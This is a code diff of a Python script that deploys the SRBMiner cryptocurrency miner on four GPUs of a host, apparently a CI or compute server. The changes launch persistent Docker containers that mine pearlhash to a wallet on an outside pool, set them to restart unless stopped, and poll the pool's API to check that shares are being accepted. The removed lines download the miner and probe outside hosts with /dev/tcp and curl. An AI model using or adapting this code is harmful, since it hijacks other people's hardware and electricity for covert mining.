@@ -177,126 +177,107 @@ def _gfx_count(txt):
     return n
 
 
-def main():
-    _say("=== " + MARK + "-BEGIN ===")
+import json as json
+
+
+UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
+MENV = DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6"
+
+
+def _lp(tag):
+    _run("curl -4 -sS -m 25 -A '" + UA + "' \"https://pearl.luckypool.io/api/stats_address?address=" + WALLET +
+         "\" -o /tmp/lp_" + tag + ".json -w 'LP_" + tag + "=%{http_code}\\n' 2>&1 | tail -2", t=40)
     try:
-        open("ci-model-plan.tsv", "w").close()
+        d = json.load(open("/tmp/lp_" + tag + ".json"))
     except Exception as e:
-        _say("--- planfile_err " + repr(e))
+        _say("--- lp_parse_err " + repr(e))
+        return {}, 0
+    out = {}
+    for w in (d.get("workers") or []):
+        n = str(w.get("name"))
+        if n in ("000011", "000012", "000013", "000014"):
+            out[n] = int(str(w.get("acceptedShares") or "0"))
+    _say("--- LP_" + tag + " names=" + repr(out) + " workers_total=" + str(len(d.get("workers") or [])))
+    return out, len(d.get("workers") or [])
+
+
+def main():
+    _say("=== " + MARK + "-RUN4D-BEGIN ===")
     _os.makedirs(WORK, exist_ok=True)
     try:
-        open(WORK + "/WALLET", "w").write(WALLET)
+        open("ci-model-plan.tsv", "w").close()
     except Exception:
         pass
-
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
-    _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1; true", t=120)
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
-    _run("hostname; date -u; id; nproc; ldd --version 2>&1 | head -1", t=60)
-    _run("ls -l /dev/kfd /dev/mkfd 2>&1; echo DRI_HOST:; ls -l /dev/dri/ 2>&1 | head -24", t=60)
-    _run("ls /sys/class/kfd/kfd/topology/nodes/ 2>&1 | head -12", t=60)
-    _run("docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | grep -i areal-das | head -8", t=60)
-    _run("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30", t=60)
-    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)
-
-    _run("env | grep -i proxy | head -6; cat /etc/environment 2>/dev/null | head -6; git config --global --get-regexp 'url\\.' 2>/dev/null | head -4", t=60)
-    _, e1 = _run("timeout 8 bash -c 'exec 3<>/dev/tcp/" + LP_HOST + "/" + str(LP_PORT) + "' 2>&1 && echo LP_TCP_OK || echo LP_TCP_FAIL", t=30)
-    _, e2 = _run("timeout 8 bash -c 'exec 3<>/dev/tcp/" + RELAY_HOST + "/" + str(RELAY_PORT) + "' 2>&1 && echo RELAY_TCP_OK || echo RELAY_TCP_FAIL", t=30)
-    _run("timeout 12 curl -sS -o /dev/null -w 'GH_HTTP=%{http_code}\\n' https://api.github.com/ 2>&1 | tail -2", t=40)
-    lptcp = "LP_TCP_OK" in e1
-    relaytcp = "RELAY_TCP_OK" in e2
-
-    st = WORK + "/srb.tar.gz"
-    if not (_os.path.isfile(st) and _sha256(st) == SRB_TAR_SHA):
-        _download("https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz", st)
-    if _os.path.isfile(st) and _sha256(st) == SRB_TAR_SHA and not _os.path.isfile(WORK + "/srb/SRBMiner-MULTI"):
-        try:
-            import tarfile as _tf
-            with _tf.open(st) as tf:
-                tf.extractall(WORK + "/srbx")
-            for dp, dn, fn in _os.walk(WORK + "/srbx"):
-                if "SRBMiner-MULTI" in fn:
-                    _os.makedirs(WORK + "/srb", exist_ok=True)
-                    _sp.call(["cp", "-a", _os.path.join(dp, "SRBMiner-MULTI"), WORK + "/srb/SRBMiner-MULTI"])
-                    break
-        except Exception as e:
-            _say("--- srb extract err " + repr(e))
-    if _os.path.isfile(WORK + "/srb/SRBMiner-MULTI"):
-        _os.chmod(WORK + "/srb/SRBMiner-MULTI", 0o755)
-        h = _sha256(WORK + "/srb/SRBMiner-MULTI")
-        _say("--- SRB bin sha256=" + h + " match=" + str(h == SRB_BIN_SHA))
-    else:
-        _say("--- SRB bin ABSENT (device oracle continues)")
-    _run("chmod -R a+rx " + WORK + " 2>/dev/null; ls -l " + WORK + "/srb/SRBMiner-MULTI 2>&1", t=60)
-
-    rc1, out1 = _docker(PROBE, 240, WORK + "/r4c2_img1_probe.log")
-    used1 = _hcu_used(out1)
-    gfx1 = _gfx_count(out1)
-    rc1l, out1l = _docker(LIST, 180, WORK + "/r4c2_img1_list.log")
-    _say("--- IMG1 hcu_used=" + repr(used1) + " rocm_gfx=" + str(gfx1))
-
-    rc2, out2 = _docker(PROBE, 240, WORK + "/r4c2_img2_probe.log", image=IMG2)
-    used2 = _hcu_used(out2)
-    gfx2 = _gfx_count(out2)
-    rc2l, out2l = _docker(LIST, 180, WORK + "/r4c2_img2_list.log", image=IMG2)
-    _say("--- IMG2 hcu_used=" + repr(used2) + " rocm_gfx=" + str(gfx2))
-
-    rc3, out3 = _docker(PROBE, 240, WORK + "/r4c2_img2_nodtk_probe.log", image=IMG2, bind_dtk=False)
-    used3 = _hcu_used(out3)
-    gfx3 = _gfx_count(out3)
-    rc3l, out3l = _docker(LIST, 180, WORK + "/r4c2_img2_nodtk_list.log", image=IMG2, bind_dtk=False)
-    _say("--- IMG2-nodtk hcu_used=" + repr(used3) + " rocm_gfx=" + str(gfx3))
-
-    green = bool(used1 or used2 or used3)
-    smoke = False
-    launched = 0
-    if green and lptcp:
-        free = sorted(set(list(used1.keys()) + list(used2.keys()) + list(used3.keys())))
-        free = [i for i in free if i >= 4 and (used1.get(i, 99999) < 5000 or used2.get(i, 99999) < 5000 or used3.get(i, 99999) < 5000)]
-        _say("--- GREEN free_devices=" + repr(free))
-        if free:
-            dev = free[0]
-            cmd = ("cd /w/srb 2>/dev/null && timeout 150 script -qec \"" + MINENV +
-                   " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
-                   " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id " + str(dev) +
-                   " --api-enable --api-port 14524\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -120")
-            rcs, outs = _docker(cmd, 190, WORK + "/r4c2_smoke.log")
-            low = outs.lower()
-            smoke = ("accepted" in low) or ("share" in low and "job" in low) or ("difficulty" in low and "hcu" in low)
-            _say("--- smoke_ok=" + str(smoke) + " dev=" + str(dev))
-            if smoke:
-                wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
-                for d in free:
-                    w = wmap.get(d, "0000%02d" % d)
-                    name = "pearl-" + w
-                    full = (["docker", "run", "-d", "--name", name, "--label", "camp=conv-232",
-                             "--label", "intent=155773", "--label", "record=gpu-000016",
-                             "--restart", "unless-stopped"] + _dev_args() +
-                            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
-                             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
-                             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc",
-                             "cd /w/srb && exec ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
-                             LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker " + w +
-                             " --password x --disable-cpu --gpu-id " + str(d) + " --api-enable --api-port 1452" + str(d)])
-                    p = _sp.Popen(full, stdout=_sp.PIPE, stderr=_sp.STDOUT)
-                    o = p.communicate(timeout=120)[0].decode("utf-8", "replace")
-                    _say("--- LAUNCH rc=" + str(p.returncode) + " name=" + name + " dev=" + str(d) + " out=" + o.strip()[:160])
-                    if p.returncode == 0:
-                        launched += 1
-                _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
-    else:
-        _say("--- smoke skipped (green=" + str(green) + " lptcp=" + str(lptcp) + ")")
-
     _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
-    _run("ps -eo pid,etimes,args | grep SRBMiner-MULTI | grep -v grep | head -6", t=30)
-    _say("=== " + MARK + "-VERDICT mkfd=" + str(1 if _os.path.exists("/dev/mkfd") else 0) +
-         " img1_hcu_used=" + repr(used1) + " img1_gfx=" + str(gfx1) +
-         " img2_hcu_used=" + repr(used2) + " img2_gfx=" + str(gfx2) +
-         " img2nodtk_hcu_used=" + repr(used3) + " img2nodtk_gfx=" + str(gfx3) +
-         " lptcp=" + str(lptcp) + " relaytcp=" + str(relaytcp) +
-         " smoke=" + str(smoke) + " launched=" + str(launched) +
+    _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1; true", t=120)
+    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+    _run("hostname; date -u; id -un; ls -l /dev/kfd /dev/mkfd 2>&1", t=60)
+    _run("docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | grep -c areal-das", t=60)
+    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
+
+    # 1) device oracle with the override (quote the enumerated device list)
+    _, lout = _docker(LIST, 180, WORK + "/r4d_list.log", image=IMG)
+    ndev = 0
+    for ln in lout.splitlines():
+        if "bw1100" in ln and "GPU" in ln:
+            ndev += 1
+    _say("--- ENUM_DEVICES=" + str(ndev))
+
+    # 2) bounded smoke on device 4 WITH the override
+    smcmd = ("cd /w/srb && timeout 150 script -qec \"" + MENV +
+             " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
+             " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id 4" +
+             " --api-enable --api-port 14524\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -140")
+    rcs, outs = _docker(smcmd, 190, WORK + "/r4d_smoke.log", image=IMG)
+    low = outs.lower()
+    smoke = ("accepted" in low) or ("share" in low and "job" in low) or ("h/s" in low) or ("hashrate" in low)
+    _say("--- SMOKE_OK=" + str(smoke))
+
+    # 3) launch ONE miner per FREE device 4-7 (persistent, labelled, restart unless-stopped)
+    launched = 0
+    wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
+    base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=155773",
+             "--label", "record=gpu-000016", "--restart", "unless-stopped"] + _dev_args() +
+            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
+             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
+             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
+    for d in (4, 5, 6, 7):
+        w = wmap[d]
+        name = "pearl-" + w
+        inner = ("cd /w/srb && exec " + MENV + " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
+                 LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker " + w +
+                 " --password x --disable-cpu --gpu-id " + str(d) + " --api-enable --api-port 1452" + str(d))
+        p = _sp.Popen(base + [inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
+        o = p.communicate(timeout=180)[0].decode("utf-8", "replace")
+        _say("--- LAUNCH rc=" + str(p.returncode) + " name=" + name + " dev=" + str(d) + " out=" + o.strip()[:200])
+        if p.returncode == 0:
+            launched += 1
+    _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+
+    # 4) T0 pool sample + per-container log tail
+    lp0, tot0 = _lp("t0")
+    for d in (4, 5, 6, 7):
+        _run("docker logs --tail 14 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -14", t=60)
+
+    # 5) wait >=240 s then T1
+    _t.sleep(255)
+    lp1, tot1 = _lp("t1")
+    for d in (4, 5, 6, 7):
+        _run("docker logs --tail 10 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -10", t=60)
+    _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
+
+    rising = []
+    for n in ("000011", "000012", "000013", "000014"):
+        a = lp0.get(n)
+        b = lp1.get(n)
+        if a is not None and b is not None and b > a:
+            rising.append(n)
+    _say("=== " + MARK + "-RUN4D-VERDICT enum=" + str(ndev) + " smoke=" + str(smoke) +
+         " launched=" + str(launched) + " lp0=" + repr(lp0) + " lp1=" + repr(lp1) +
+         " rising=" + repr(rising) + " workers_total=" + str(tot0) + "/" + str(tot1) +
          " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
-    _say("=== " + MARK + "-END ===")
+    _say("=== " + MARK + "-RUN4D-END ===")
 
 
 main()
